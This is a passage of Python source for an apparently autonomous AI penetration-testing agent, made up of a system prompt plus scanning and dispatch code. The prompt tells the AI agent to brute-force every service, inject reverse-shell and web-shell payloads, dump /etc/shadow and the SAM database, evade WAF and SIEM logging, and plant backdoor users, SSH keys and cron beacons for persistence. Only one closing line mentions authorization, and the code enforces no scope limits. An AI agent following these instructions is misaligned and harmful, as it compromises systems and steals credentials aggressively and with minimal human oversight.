CRITICAL RULES:
- NEVER skip os_fingerprint before payload generation
- ALWAYS test multiple exploitation techniques (don't stop after first failure)
- For gain_shell_access goal: Be EXTREMELY AGGRESSIVE with all exploitation tools
- Run bruteforce on EVERY discovered service (SSH, RDP, FTP, MySQL, web admin)
- Try MULTIPLE payloads (bash, python, php, powershell, perl)
- If exploitation fails, IMMEDIATELY try alternative approach
- Document ALL exploitation attempts with detailed steps
- Chain tools logically: os_fingerprint ‚Üí port_scan ‚Üí nuclei (quick wins!) ‚Üí crawler ‚Üí dirbuster ‚Üí web_pentest ‚Üí fuzzer ‚Üí bruteforce ‚Üí exploit_vuln ‚Üí payload_generate ‚Üí execute_command (post-exploit)
- ALWAYS run nuclei after port_scan - it's fast, free (no API), and finds default logins/CVEs immediately

üéØ MASTER-LEVEL TACTICAL INTELLIGENCE:

1Ô∏è‚É£ ATTACK CHAIN THINKING (Red Team Mindset):
   ‚Ä¢ Don't test in isolation - CHAIN vulnerabilities for maximum impact
   ‚Ä¢ Example chains:
     - SQLi ‚Üí database credentials ‚Üí SSH access ‚Üí privilege escalation ‚Üí domain admin
     - XSS ‚Üí steal admin cookie ‚Üí admin panel access ‚Üí file upload ‚Üí web shell ‚Üí reverse shell
     - SSRF ‚Üí internal network access ‚Üí cloud metadata API ‚Üí AWS keys ‚Üí infrastructure compromise
     - Subdomain takeover ‚Üí phishing landing page ‚Üí credential harvest ‚Üí lateral movement
   ‚Ä¢ Always ask: "If I exploit THIS, what does it unlock NEXT?"
   ‚Ä¢ Think like APT groups: establish foothold ‚Üí maintain persistence ‚Üí lateral movement ‚Üí objective

2Ô∏è‚É£ DEFENSIVE AWARENESS (Blue Team Mindset):
   ‚Ä¢ Identify security controls in place:
     - WAF/IPS detected? Adapt payloads (encoding, fragmentation, protocol manipulation)
     - Rate limiting? Slow down attacks, randomize timing
     - Input validation? Try bypass techniques (double encoding, unicode, null bytes)
     - Logging/SIEM? Use stealthy techniques, avoid noisy scans
   ‚Ä¢ For EACH vulnerability found, document:
     - Why the defense failed (misconfiguration, missing control, weak implementation)
     - Proper remediation with specific configuration examples
     - Detection signatures for blue team (IDS rules, log patterns, SIEM queries)
     - Defense-in-depth recommendations (not just fix one layer)

3Ô∏è‚É£ INTELLIGENT PRIORITIZATION:
   ‚Ä¢ Exploitation Path Analysis:
     1. Quick wins with high impact: default credentials, known CVEs, exposed admin panels
     2. Low-hanging fruit: XSS on admin panel, SQLi in search, file upload with weak filters
     3. Complex chains: SSRF + XXE, CSRF + XSS, authentication bypass + IDOR
   ‚Ä¢ Risk-based testing:
     - CRITICAL: RCE, SQLi with DBA, unrestricted file upload, exposed admin interfaces
     - HIGH: XSS on admin, authentication bypass, SSRF to internal network, privilege escalation
     - MEDIUM: information disclosure, weak SSL, CORS misconfiguration, missing headers
     - LOW: verbose error messages, version disclosure, directory listing

4Ô∏è‚É£ CREATIVE EXPLOITATION (Master Level):
   ‚Ä¢ Standard technique failed? Try alternatives:
     - SQLi blocked by WAF? ‚Üí Try boolean-based, time-based, second-order, HTTP parameter pollution
     - File upload filters? ‚Üí Try .php5, .phtml, .php.jpg, null byte injection, MIME type bypass
     - Command injection sanitized? ‚Üí Try alternative syntax: ${{IFS}}, $(), backticks, pipe chains
     - Authentication required? ‚Üí Try JWT manipulation, cookie tampering, session fixation, IDOR
   ‚Ä¢ Combine techniques for maximum effect:
     - XSS + CSRF = account takeover
     - SSRF + XXE = internal network compromise
     - SQLi + command execution = direct RCE
     - File inclusion + log poisoning = RCE

5Ô∏è‚É£ POST-EXPLOITATION INTELLIGENCE:
   ‚Ä¢ After gaining access, think strategically:
     - DON'T just run "whoami" and stop
     - Enumerate thoroughly: users, privileges, network, processes, scheduled tasks
     - Look for privilege escalation: SUID binaries, sudo misconfig, kernel exploits, weak services
     - Identify high-value targets: databases, config files, SSH keys, password files, source code
     - Maintain access: install backdoor user, SSH key persistence, scheduled task, web shell
     - Lateral movement: scan internal network, dump credentials, pivot to other systems

6Ô∏è‚É£ COMPREHENSIVE DOCUMENTATION:
   ‚Ä¢ For EVERY finding, provide:
     ‚úì Detailed technical description (not just "SQL injection found")
     ‚úì Step-by-step exploitation proof-of-concept
     ‚úì Business impact analysis (data breach, system compromise, financial loss)
     ‚úì Root cause analysis (why defense failed - code review, architecture flaw)
     ‚úì Specific remediation steps with code examples
     ‚úì Blue team detection methods (IDS signatures, log patterns, behavioral indicators)
     ‚úì Defense-in-depth recommendations (multiple layers of defense)

‚ö†Ô∏è CRITICAL TOOL USAGE CLARIFICATION:
   ‚Ä¢ execute_command: Runs commands on YOUR attack machine (setup listeners, download tools)
     Example: execute_command with cmd="nc -lvnp 4444" ‚Üí starts listener on attacker machine
   ‚Ä¢ exploit_vuln: EXPLOITS vulnerabilities on TARGET to gain shell
     Example: exploit_vuln with vuln_id=<finding_id> ‚Üí exploits SQLi/RCE on target, gains shell
   ‚Ä¢ payload_generate: Generates payloads (shells, exploits)
     Example: payload_generate shell="bash" ‚Üí creates reverse shell payload
   ‚Ä¢ bruteforce: Attacks authentication (login pages, SSH, FTP, etc.)
     Example: bruteforce with target="http://10.80.25.11:8080/login.php", auth_type="form", usernames=["admin"], wordlist="common"
   
   üéØ TO GAIN SHELL ON TARGET: Use exploit_vuln (NOT execute_command)
   üéØ TO SETUP LISTENER: Use execute_command on attacker machine FIRST
   üéØ TO ATTACK LOGIN: Use bruteforce on discovered login pages IMMEDIATELY
   
üî• MANDATORY EXPLOITATION SEQUENCE (DO NOT SKIP):
   1. Found login page ‚Üí IMMEDIATELY bruteforce with common creds (admin/admin, admin/password)
   2. Found SQLi ‚Üí IMMEDIATELY use exploit_vuln to inject shell payload
   3. Found file upload ‚Üí IMMEDIATELY use exploit_vuln to upload web shell
   4. Found command injection ‚Üí IMMEDIATELY use exploit_vuln to gain reverse shell
   
   ‚ùå DON'T just find vulnerabilities and stop
   ‚úÖ DO exploit every finding for maximum impact

AGGRESSIVE SHELL GAINING STRATEGY (for gain_shell_access goal):

Phase 1 - DEEP RECONNAISSANCE (Iterations 1-3):
   ‚Üí port_scan: Scan ports 1-10000 (use large port range for comprehensive coverage)
   ‚Üí os_fingerprint: MANDATORY - Must detect OS before exploitation
   ‚Üí recon: DNS, WHOIS, subdomain enumeration
   ‚Üí tech_detect: Identify exact software versions for CVE matching
   ‚Üí advanced_scan: Service banner grabbing for version information
   OUTPUT REQUIRED: Target OS (Windows/Linux/Unix), open ports, service versions

Phase 2 - COMPREHENSIVE ENUMERATION (Iterations 4-7):
   ‚Üí crawler: Discover ALL web endpoints, parameters, API paths, hidden forms
   ‚Üí dirbuster: Find admin panels, upload pages, backup files, config files, database interfaces
      * Use aggressive wordlist, test for: /admin, /upload, /shell.php, /config.php, /backup.sql
   ‚Üí ssl_analyze: Check for SSL vulnerabilities, certificate issues
   ‚Üí advanced_scan: Deep service enumeration with version detection
   OUTPUT REQUIRED: Web paths, upload endpoints, admin panels, vulnerable services

Phase 3 - AGGRESSIVE VULNERABILITY DISCOVERY (Iterations 8-12):
   ‚Üí web_pentest: COMPREHENSIVE OWASP Top 10 testing:
      * A01 - Broken Access Control: Test EVERY endpoint for IDOR, privilege escalation
      * A03 - Injection: AGGRESSIVE SQLi testing (error-based, boolean, time-based, UNION, stacked queries)
         - Test ALL parameters, headers, cookies
         - Try command injection: ; whoami, | whoami, && whoami, `whoami`, $(whoami)
      * A04 - File Upload: Test unrestricted file upload for web shell upload
         - Try .php, .jsp, .asp, .aspx, .py extensions
         - Bypass filters with double extensions: .php.jpg, .php5, .phtml
      * A10 - SSRF: Test for internal network access, cloud metadata endpoints
      * Command Injection: Test ALL input fields with system command payloads
      * XXE: Test XML parsers for external entity injection
      * SSTI: Test template engines for server-side template injection
   ‚Üí api_test: Comprehensive API security testing:
      * JWT vulnerabilities (None algorithm, weak signing)
      * Authentication bypass attempts
      * IDOR in API endpoints
      * Parameter tampering for privilege escalation
   ‚Üí fuzzer: AGGRESSIVE parameter fuzzing:
      * Fuzz ALL parameters with injection payloads
      * Test for buffer overflows, format strings
      * Command injection fuzzing with shell metacharacters
   ‚Üí takeover_scan: Check subdomain takeover for pivot opportunities
   ‚Üí nuclei: Run with ALL templates for CVE scanning (5000+ templates)
      * Focus on RCE, command injection, file upload CVEs
   OUTPUT REQUIRED: Exploitable RCE, command injection, file upload, SQLi with command execution

Phase 4 - AGGRESSIVE EXPLOITATION (Iterations 13-16, REQUIRES HIGH RISK):
   ‚Üí bruteforce: ATTACK common services:
      * SSH (port 22): Common usernames (root, admin, user, ubuntu, ec2-user)
      * FTP (port 21): anonymous, admin:admin, ftp:ftp
      * MySQL (port 3306): root:root, root:password, root:toor
      * PostgreSQL (port 5432): postgres:postgres, postgres:password
      * RDP (port 3389): Administrator:Password123, admin:admin
      * Web admin panels: admin:admin, admin:password, root:root
      * Use wordlist: /usr/share/wordlists/rockyou.txt (top 1000 passwords)
   ‚Üí exploit_vuln: Execute discovered RCE/command injection:
      * Command injection: Use discovered injection point with reverse shell
      * File upload: Upload web shell (PHP, JSP, ASPX) to discovered upload endpoint
      * SQLi: Use xp_cmdshell (MSSQL) or sys_exec (MySQL) for command execution
      * Deserialization: Exploit insecure deserialization for RCE
   ‚Üí payload_generate: Generate MULTIPLE payloads:
      * Reverse shells: bash, powershell, python, perl, ruby, nc, socat
      * Bind shells: For targets without outbound connectivity
      * Web shells: PHP, JSP, ASPX for web server compromise
      * Encoded payloads: Base64, hex encoding to bypass filters
   ‚Üí execute_command: Setup attack infrastructure:
      * Start netcat listener: nc -lvnp 4444 (Linux)
      * Start HTTP server for payload hosting: python3 -m http.server 8000
      * Setup reverse shell listener with ncat/socat
   OUTPUT REQUIRED: Working shell access, remote code execution, credential compromise

Phase 5 - POST-EXPLOITATION & ENUMERATION (Iterations 17+):
   ‚Üí execute_command: Run post-exploitation commands on target:
      LINUX/UNIX:
      * Enumerate users: cat /etc/passwd, cat /etc/shadow (if root)
      * Check privileges: id, sudo -l, groups
      * Find SUID binaries: find / -perm -4000 2>/dev/null
      * Check cron jobs: cat /etc/crontab, crontab -l
      * Network enumeration: netstat -antup, ss -antup
      * Find sensitive files: find / -name "*.conf" -o -name "*.key" -o -name "*.db"
      * Search for passwords: grep -r "password" /etc/ /var/www/ /home/
      * Kernel version: uname -a (check for kernel exploits)
      
      WINDOWS:
      * Enumerate users: net user, net localgroup administrators
      * Check privileges: whoami /priv, whoami /groups
      * System info: systeminfo (check for missing patches)
      * Network enumeration: netstat -ano, ipconfig /all
      * Find sensitive files: dir /s /b C:\\*password*.txt C:\\*config*.xml
      * Search registry: reg query HKLM /f password /t REG_SZ /s
      * Check scheduled tasks: schtasks /query /fo LIST /v
      * Dump SAM database (if admin): reg save HKLM\\SAM sam.save
   ‚Üí Establish persistence:
      * Add backdoor user account
      * Install SSH key for persistent access
      * Create scheduled task/cron job for beacon
      * Upload additional payloads for redundancy
   OUTPUT REQUIRED: Privilege level, user enumeration, sensitive data discovered

CRITICAL SHELL ACCESS REQUIREMENTS:
1. ALWAYS run os_fingerprint BEFORE payload generation (Iteration 1-3)
2. NEVER generate payloads without knowing target OS
3. Test EVERY discovered endpoint for injection vulnerabilities
4. Bruteforce ALL discovered services (SSH, RDP, FTP, databases, web admin)
5. Try MULTIPLE exploitation techniques (don't stop after first failure)
6. Generate MULTIPLE payload variants (bash, python, php, powershell)
7. Setup listener BEFORE executing reverse shell payload
8. If one technique fails, IMMEDIATELY try alternative approach
9. Document ALL exploitation attempts and results
10. POST-EXPLOITATION is MANDATORY - enumerate system thoroughly after gaining access

REMEDIATION REQUIREMENTS:
- Document EXACT exploitation steps (commands, payloads, timing)
- Provide detailed remediation for EACH vulnerability
- Include CVE numbers if applicable
- Provide patch/configuration recommendations
- Suggest defense mechanisms (WAF rules, IDS signatures)
- Document business impact of each finding
- Provide proof-of-concept (PoC) code
- Include CVSS scores and risk ratings

Response format (JSON only):
{{
    "reasoning": "Explain your MASTER-LEVEL strategic decision-making. Analyze patterns, identify attack chains, explain why this tool NOW. Reference specific previous findings.",
    "next_action": "tool_name",
    "parameters": {{"key": "value"}},
    "risk_level": "low|medium|high|critical",
    "expected_outcome": "Specific, measurable outcome (not just 'find vulnerabilities' - be precise: 'discover SQLi in login form', 'gain RCE via file upload')",
    "exploitation_chain": "If exploiting: describe full attack chain from initial access to objective (e.g., 'XSS ‚Üí session hijack ‚Üí admin access ‚Üí file upload ‚Üí RCE ‚Üí privilege escalation')",
    "defensive_considerations": "What security controls might be in place? How to bypass/evade them? (WAF, rate limiting, input validation, logging)",
    "success_indicators": "How to verify success (specific response codes, timing differences, file creation, shell callback)",
    "fallback_plan": "If this technique fails, what's the next alternative approach?",
    "blue_team_perspective": "How would a defender detect this action? What remediation would prevent it?",
    "stop_testing": false,
    "goal_progress": "Percentage estimate of goal completion (0-100)"
}}

Be strategic, thorough, and ethical. Always consider authorization and legal boundaries."""

    def _format_findings_for_ai(self) -> str:
        """Format current findings for AI context"""
        if not self.findings:
            return "No findings yet. Start with reconnaissance."
        
        summary = f"Current findings ({len(self.findings)} total):\n\n"
        
        # Group by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            items = by_severity[severity]
            if items:
                summary += f"{severity.upper()} ({len(items)}):\n"
                for finding in items[:3]:  # Show top 3 per severity
                    summary += f"- [{finding.tool}] {finding.description}\n"
                if len(items) > 3:
                    summary += f"  ... and {len(items) - 3} more\n"
                summary += "\n"
        
        return summary
    
    def _format_actions_for_ai(self) -> str:
        """Format previous actions for AI context"""
        if not self.actions:
            return "No actions taken yet."
        
        summary = f"Previous actions ({len(self.actions)}):\n"
        for action in self.actions[-5:]:  # Show last 5 actions
            summary += f"- {action.action_type} using {action.tool}: {action.reasoning}\n"
        
        return summary
    
    async def _retry_with_backoff(self, func, max_retries: int = 5, base_delay: float = 3.0):
        """Retry function with exponential backoff for rate limits - works with ALL providers"""
        # GitHub Models rate limits: Free (15 req/min), Copilot Plus (60 req/min)
        if self.config.ai_provider == "github":
            base_delay = 4.0  # Optimized for Copilot Plus (60 req/min = 1s min, use 4s for safety)
        
        for attempt in range(max_retries):
            try:
                return await func()
            except httpx.HTTPStatusError as e:
                # Handle HTTP rate limit responses (429, 503 service unavailable)
                if e.response.status_code in [429, 503]:
                    if attempt < max_retries - 1:
                        delay = base_delay * (2 ** attempt)  # Exponential: 10s, 20s, 40s, 80s, 160s for GitHub
                        print(f"‚è≥ API rate limit/unavailable (HTTP {e.response.status_code}), retrying in {delay:.1f}s (attempt {attempt + 1}/{max_retries})...")
                        print(f"   GitHub Models limit: 15 requests/minute. Consider switching to OpenAI/Anthropic for higher limits.")
                        await asyncio.sleep(delay)
                        continue
                    else:
                        # Last attempt failed - provide fallback guidance
                        raise Exception(
                            f"API rate limit exceeded after {max_retries} attempts.\n"
                            f"GitHub Models free tier: 15 req/min, 150 req/day\n"
                            f"Solutions:\n"
                            f"1. Wait 5-10 minutes and retry\n"
                            f"2. Use --max-iterations 5 to reduce API calls\n"
                            f"3. Switch to OpenAI: --ai-provider openai\n"
                            f"4. Use nuclei scanning (no API): scorpion nuclei -t <target>"
                        )
                raise
            except Exception as e:
                error_str = str(e).lower()
                # Detect rate limits from error messages (provider-agnostic)
                rate_limit_indicators = [
                    "rate limit", "rate_limit", "ratelimit",
                    "too many requests", "quota exceeded", 
                    "429", "throttle", "retry after",
                    "capacity", "overloaded"
                ]
                
                is_rate_limit = any(indicator in error_str for indicator in rate_limit_indicators)
                
                if attempt < max_retries - 1 and is_rate_limit:
                    delay = base_delay * (2 ** attempt)  # Exponential backoff
                    print(f"‚è≥ API rate limit detected ({type(e).__name__}), retrying in {delay:.1f}s (attempt {attempt + 1}/{max_retries})...")
                    await asyncio.sleep(delay)
                    continue
                raise
        raise Exception(f"API calls failed after {max_retries} attempts with exponential backoff")
    
    async def _get_next_action(self) -> Dict[str, Any]:
        """Ask AI to determine next action"""
        system_prompt = self._get_system_prompt()
        
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        remaining_time = self.config.time_limit - elapsed
        
        user_prompt = f"""Current state of penetration test:

Target: {self.config.target}
Elapsed time: {elapsed:.1f} minutes
Remaining time: {remaining_time:.1f} minutes
Iteration: {self.iteration + 1}/{self.config.max_iterations}

{self._format_findings_for_ai()}

{self._format_actions_for_ai()}

Based on the current findings and the primary goal ({self.config.primary_goal.value}), what should be the next action?

Respond with a JSON object only (no additional text)."""

        # Use aggressive retry with exponential backoff for rate limits (ALL providers)
        async def query_ai():
            return await self.ai_provider.query(system_prompt, user_prompt, temperature=0.7)
        
        try:
            # 5 retries with 3s base delay = up to 48s max wait before fallback
            response = await self._retry_with_backoff(query_ai, max_retries=5, base_delay=3.0)
        except Exception as e:
            error_msg = str(e)
            print(f"[ERROR] AI query failed after retries: {error_msg}")
            
            # Smart fallback: Use nuclei for vulnerability scanning if rate limited
            # Check if we've done basic reconnaissance already
            has_port_scan = any(f.tool == "port_scan" for f in self.findings)
            has_web_scan = any(f.tool in ["web_pentest", "nuclei"] for f in self.findings)
            
            if has_port_scan and not has_web_scan:
                # Perfect time to run nuclei - we know ports but haven't done vuln scanning
                print("  [FALLBACK] Rate limited - switching to template-based Nuclei scan")
                return {
                    "reasoning": "AI rate limited. Using Nuclei (8900+ templates) for comprehensive vulnerability scanning without API calls.",
                    "next_action": "nuclei",
                    "parameters": {
                        "severity": ["critical", "high", "medium"],  # Focus on actionable findings
                        "tags": ["cve", "owasp", "default-login", "exposure", "misconfig"]
                    },
                    "risk_level": "medium",
                    "stop_testing": False
                }
            elif not has_port_scan:
                # Still in early recon phase
                return {
                    "reasoning": "AI provider unavailable, continuing reconnaissance",
                    "next_action": "port_scan",
                    "parameters": {},
                    "risk_level": "medium",
                    "stop_testing": False
                }
            else:
                # Already scanned - stop gracefully
                return {
                    "reasoning": "AI provider rate limited and core scanning complete",
                    "next_action": "recon",
                    "parameters": {},
                    "risk_level": "low",
                    "stop_testing": True  # Stop if we've already done main scans
                }
        
        # Extract JSON from response (handle markdown code blocks and empty responses)
        response = response.strip()
        if not response:
            # Empty response - default to reconnaissance
            return {
                "next_action": "recon",
                "parameters": {"domain": self.config.target},
                "reasoning": "Starting with basic reconnaissance"
            }
        
        if response.startswith("```"):
            lines = response.split("\n")
            response = "\n".join(lines[1:-1])
        
        try:
            return json.loads(response)
        except json.JSONDecodeError:
            # If JSON parsing fails, extract JSON-like content
            import re
            json_match = re.search(r'\{[\s\S]*\}', response)
            if json_match:
                return json.loads(json_match.group())
            # Fallback to recon
            return {
                "next_action": "recon",
                "parameters": {"domain": self.config.target},
                "reasoning": "AI response parsing failed, defaulting to reconnaissance"
            }
    
    async def _execute_action(self, action: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the action determined by AI"""
        tool = action["next_action"]
        params = action.get("parameters", {})
        
        # Record the action
        agent_action = AgentAction(
            timestamp=datetime.now().isoformat(),
            action_type="execute",
            tool=tool,
            parameters=params,
            reasoning=action["reasoning"],
            risk_level=action.get("risk_level", "medium")
        )
        self.actions.append(agent_action)
        
        try:
            if tool == "port_scan":
                result = await self._run_port_scan(params)
            elif tool == "syn_scan":
                result = await self._run_syn_scan(params)
            elif tool == "udp_scan":
                result = await self._run_udp_scan(params)
            elif tool == "advanced_scan":
                result = await self._run_advanced_scan(params)
            elif tool == "dirbuster":
                result = await self._run_dirbuster(params)
            elif tool == "crawler":
                result = await self._run_crawler(params)
            elif tool == "fuzzer":
                result = await self._run_fuzzer(params)
            elif tool == "bruteforce":
                result = await self._run_bruteforce(params)
            elif tool == "nuclei":
                result = await self._run_nuclei(params)
            elif tool == "cloud_audit":
                result = await self._run_cloud_audit(params)
            elif tool == "k8s_audit":
                result = await self._run_k8s_audit(params)
            elif tool == "container_audit":
                result = await self._run_container_audit(params)
            elif tool == "exploit_vuln":
                result = await self._run_exploit(params)
            elif tool == "ssl_analyze":
                result = await self._run_ssl_analyze(params)
            elif tool == "os_fingerprint":
                result = await self._run_os_fingerprint(params)
            elif tool == "web_pentest":
                result = await self._run_web_pentest(params)
            elif tool == "api_test":
                result = await self._run_api_test(params)
            elif tool == "takeover_scan":
                result = await self._run_takeover_scan(params)
            elif tool == "tech_detect":
                result = await self._run_tech_detect(params)
            elif tool == "recon":
                result = await self._run_recon(params)
            elif tool == "payload_generate":
                result = await self._run_payload_generate(params)
            elif tool == "execute_command":
                result = await self._run_execute_command(params)
            elif tool == "service_enum":
                result = await self._run_service_enumeration(params)
            else:
                result = {"error": f"Unknown tool: {tool}"}
            
            return result
        except httpx.HTTPError as e:
            return {"error": f"HTTP error executing {tool}: {str(e)}"}
        except asyncio.TimeoutError:
            return {"error": f"Timeout executing {tool}"}
        except ValueError as e:
            return {"error": f"Invalid parameters for {tool}: {str(e)}"}
        except Exception as e:
            return {"error": f"Error executing {tool}: {str(e)}"}
    
    async def _run_port_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute intelligent port scan with service enumeration and version detection"""
        # Provide smart defaults based on stealth level and target type
        # Check if ports are provided and valid (handle None, empty dict, empty list)
        ports = params.get("ports", None) if params else None
        
        # Parse ports if string (AI might send "80,8080" instead of [80,8080])
        if isinstance(ports, str):
            try:
                # Handle comma-separated string: "80,8080,443"
                ports = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
                print(f"  [INFO] Parsed port string to list: {ports}")
            except:
                print(f"  [WARNING] Could not parse port string: {ports}. Using defaults.")
                ports = None
        
        # If ports is None, empty list, or invalid, use smart defaults
        if not ports or (isinstance(ports, list) and len(ports) == 0):
            # Intelligent port selection based on discovered information
            if self.config.stealth_level == StealthLevel.HIGH:
                # Minimal ports for stealthy scan
                ports = [80, 443, 22, 21, 3389]
            elif self.config.stealth_level == StealthLevel.MODERATE:
                # Common services
                ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
            else:
                # Comprehensive scan including less common services
                ports = [20, 21, 22, 23, 25, 53, 69, 80, 110, 111, 123, 135, 137, 138, 139, 143, 161, 162, 389, 443, 445, 465, 514, 587, 636, 993, 995, 1433, 1521, 1723, 2049, 3306, 3389, 5432, 5900, 5984, 6379, 8080, 8443, 8888, 9000, 9090, 9200, 9300, 27017, 27018, 50000]
            print(f"  [INFO] Using default ports for {self.config.stealth_level.value} stealth level: {len(ports)} ports")
        elif isinstance(ports, list):
            print(f"  [INFO] Scanning {len(ports)} specified ports")
        else:
            # Invalid port format - use defaults
            print(f"  [WARNING] Invalid port format: {type(ports)}. Using defaults.")
            ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 8080, 8443]
        
        concurrency = params.get("concurrency", 100 if self.config.stealth_level == StealthLevel.LOW else 20)
        scan_type = params.get("scan_type", "tcp").lower()
        
        # Validate scan type
        valid_scan_types = ["tcp", "udp", "fin", "xmas", "null", "ack"]
        if scan_type not in valid_scan_types:
            return {
                "error": f"Invalid scan type '{scan_type}'. Valid types: {', '.join(valid_scan_types)}",
                "fallback": "tcp"
            }
        
        result_list = await async_port_scan(
            self.target_host,
            ports=ports,
            concurrency=concurrency
        )
        
        # Convert to findings with intelligent exploitation recommendations
        open_ports = [r for r in result_list if r.get("state") == "open"]
        high_value_services = []
        
        if open_ports:
            for port_info in open_ports:
                port = port_info['port']
                service = port_info.get('service', 'unknown')
                
                # Intelligent severity and exploitation potential based on service
                severity = "info"
                exploitation_potential = "low"
                recommended_action = "Further enumerate service"
                
                # High-value targets
                if port in [21, 22, 23, 3389, 5900]:  # FTP, SSH, Telnet, RDP, VNC
                    severity = "medium"
                    exploitation_potential = "medium"
                    recommended_action = f"Attempt bruteforce attack on {service}. Common usernames: admin, root, administrator"
                    high_value_services.append(f"{service}:{port}")
                elif port in [445, 139]:  # SMB
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = "Check for EternalBlue (MS17-010), SMB null sessions, and share enumeration"
                    high_value_services.append(f"{service}:{port}")
                elif port in [3306, 5432, 1433, 1521, 27017]:  # Databases
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = f"Attempt {service} bruteforce. Check for default credentials and SQL injection"
                    high_value_services.append(f"{service}:{port}")
                elif port in [80, 443, 8080, 8443]:  # HTTP/HTTPS
                    severity = "medium"
                    exploitation_potential = "medium"
                    recommended_action = "Run web application scan (SQLi, XSS, RCE). Check for admin panels, directory traversal"
                    high_value_services.append(f"{service}:{port}")
                elif port in [6379, 11211]:  # Redis, Memcached
                    severity = "high"
                    exploitation_potential = "critical"
                    recommended_action = "Check for unauthenticated access. Redis can lead to RCE via module loading"
                    high_value_services.append(f"{service}:{port}")
                elif port in [9200, 9300]:  # Elasticsearch
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = "Check for unauthenticated API access. Elasticsearch often exposes sensitive data"
                    high_value_services.append(f"{service}:{port}")
                
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="port_scan",
                    severity=severity,
                    category="reconnaissance",
                    description=f"Open port {port} - {service}",
                    details=port_info,
                    exploitation_potential=exploitation_potential,
                    recommended_action=recommended_action
                )
                self.findings.append(finding)
        
        return {
            "open_ports": len(open_ports),
            "details": open_ports,
            "high_value_services": high_value_services,
            "exploitation_suggestions": [f.recommended_action for f in self.findings if f.exploitation_potential in ["high", "critical"]][-5:]
        }
    
    async def _run_syn_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SYN scan"""
        ports = params.get("ports", list(range(1, 1001)))
        
        try:
            result_list = await async_syn_scan(
                self.config.target,
                ports=ports
            )
            
            open_ports = [r for r in result_list if r.get("state") == "open"]
            if open_ports:
                for port_info in open_ports:
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="syn_scan",
                        severity="info",
                        category="reconnaissance",
                        description=f"Open port {port_info.get('port')} (SYN scan)",
                        details=port_info,
                        exploitation_potential="low",
                        recommended_action="Version detection"
                    )
                    self.findings.append(finding)
            
            return {"open_ports": len(open_ports), "details": open_ports}
        except Exception as e:
            return {"error": f"SYN scan requires admin/root privileges: {e}"}
    
    async def _run_ssl_analyze(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze SSL/TLS"""
        port = params.get("port", 443)
        
        result = await analyze_ssl(self.config.target, port=port)
        
        # Check for vulnerabilities
        if result.get("vulnerabilities"):
            for vuln in result["vulnerabilities"]:
                severity = "high" if "critical" in vuln.lower() else "medium"
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="ssl_analyze",
                    severity=severity,
                    category="ssl_tls",
                    description=vuln,
                    details=result,
                    exploitation_potential="medium",
                    recommended_action="Update SSL/TLS configuration"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_os_fingerprint(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run OS fingerprinting"""
        fingerprinter = OSFingerprinter()
        # Use comprehensive fingerprint with common ports
        open_ports = params.get("ports", [80, 443, 22, 21, 25])
        result = await fingerprinter.comprehensive_fingerprint(self.config.target, open_ports)
        
        if result.get("os_match"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="os_fingerprint",
                severity="info",
                category="reconnaissance",
                description=f"OS detected: {result['os_match']} (confidence: {result.get('confidence', 0)}%)",
                details=result,
                exploitation_potential="low",
                recommended_action="Tailor exploits to OS"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_web_pentest(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run web application penetration test"""
        # Smart URL construction using parsed target
        if params.get("url"):
            target_url = params["url"]
        else:
            # Check if target is localhost/private IP
            host_lower = self.target_host.lower()
            is_local = (host_lower in ["localhost", "127.0.0.1", "::1", "0.0.0.0"] or 
                       host_lower.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.")))
            
            # Add protocol (http for local/private, https for public)
            protocol = "http" if is_local else "https"
            
            # Use the port if specified, otherwise default
            if self.target_port:
                target_url = f"{protocol}://{self.target_host}:{self.target_port}"
            else:
                # Default to port 80 for http, 443 for https
                port = "80" if is_local else "443"
                target_url = f"{protocol}://{self.target_host}:{port}"
        
        try:
            tester = AdvancedWebTester(
                target=target_url,
                concurrency=10 if self.config.stealth_level == StealthLevel.HIGH else 50,
                timeout=15.0
            )
            
            # Add overall timeout to prevent hanging - adaptive based on target type
            host_lower = self.target_host.lower()
            is_local = (host_lower in ["localhost", "127.0.0.1", "::1", "0.0.0.0"] or 
                       host_lower.startswith(("192.168.", "10.")))
            timeout_duration = 60.0 if is_local else 180.0  # 1min local, 3min external
            
            vulnerabilities = await asyncio.wait_for(
                tester.run_full_scan(),
                timeout=timeout_duration
            )
            
            for vuln in vulnerabilities:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="web_pentest",
                    severity=vuln.severity.lower(),
                    category="web_application",
                    description=f"{vuln.vuln_type}: {vuln.description}",
                    details=asdict(vuln),
                    exploitation_potential=vuln.severity.lower(),
                    recommended_action=vuln.remediation
                )
                self.findings.append(finding)
            
            return {"vulnerabilities_found": len(vulnerabilities), "details": [asdict(v) for v in vulnerabilities]}
        
        except asyncio.TimeoutError:
            host_lower = self.target_host.lower()
            is_local = (host_lower in ["localhost", "127.0.0.1", "::1", "0.0.0.0"] or 
                       host_lower.startswith(("192.168.", "10.")))
            timeout_used = "60" if is_local else "180"
            return {"error": f"Web pentest timed out after {timeout_used} seconds. Scan may be too comprehensive. Try specifying specific pages.", "timeout": True}
        except Exception as e:
